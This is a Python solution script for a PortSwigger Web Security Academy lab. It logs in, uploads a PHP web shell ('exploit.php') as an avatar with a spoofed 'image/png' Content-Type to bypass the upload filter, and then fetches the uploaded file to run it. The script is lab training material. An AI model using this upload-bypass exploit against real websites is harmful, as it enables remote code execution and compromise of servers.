# https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

import requests
from bs4 import BeautifulSoup

url = 'https://....web-security-academy.net'
s = requests.Session()

def get_csrf_token(r: requests.Response):
    return BeautifulSoup(r.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')

r = s.get(f'{url}/login')

body = {
    'username': 'wiener',
    'password': 'peter',
    'csrf': get_csrf_token(r)
}
r = s.post(f'{url}/login', data=body)

body = {
    'user': 'wiener',
    'csrf': get_csrf_token(r)
}
files = {
    'avatar': ('exploit.php', open('exploit.php','rb'), 'image/png')
}
r = s.post(f'{url}/my-account/avatar', data=body, files=files)

r = s.get(f'{url}/files/avatars/exploit.php')

print(r.text)
